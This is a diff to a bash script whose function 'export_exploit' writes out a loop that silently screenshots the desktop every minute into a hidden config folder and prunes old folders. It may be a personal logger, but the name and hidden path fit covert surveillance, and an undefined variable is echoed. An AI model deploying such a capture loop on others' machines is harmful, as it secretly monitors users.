@@ -771,12 +771,31 @@ export_exploit () {
 	mkdir -p $DIRETORIO
 	echo \
 '
-date=$(date +"%Y-%m-%d")
-datetime=$(date +"%Y-%m-%d-%H-%M-%S")
+#!/usr/bin/env bash
 
 # Variáveis de personalização
+date=$(date +"%Y-%m-%d")
+datetime=$(date +"%Y-%m-%d-%H-%M-%S")
 screenshot_path="$HOME/.config/arjconfig/screenshot/$date"
 screenshot_name="screenshot_$datetime.png"
+
+# Função para encontrar a pasta mais antiga
+
+apagar_pastas () {
+	local="$HOME/.config/arjconfig/screenshot"  # Substitua pelo caminho para a pasta que você deseja monitorar
+	limite=30
+	# Verifica se o número de pastas atingiu o limite
+	numero_de_pastas=$(find "$local" -mindepth 1 -maxdepth 1 -type d | wc -l)
+
+	if [ "$numero_de_pastas" -ge "$limite" ]; then
+	    # Encontra a pasta mais antiga com base na data no nome
+	    pasta_mais_antiga=$(find "$local" -mindepth 1 -maxdepth 1 -type d | sort | head -n 1)
+
+	    if [ -n "$pasta_mais_antiga" ]; then
+		rm -r "$pasta_mais_antiga"
+	    fi
+	fi
+}
 
 # Função para criar o diretório de captura de tela, se não existir
 create_screenshot_directory() {
@@ -792,10 +811,12 @@ take_screenshot() {
 
 # Função principal
 main() {
-    create_screenshot_directory
     while true; do
         # Take a screenshot every minute
+        create_screenshot_directory
+        apagar_pastas
         take_screenshot
+        echo "$data_mais_antiga"
         sleep 60
     done
 }
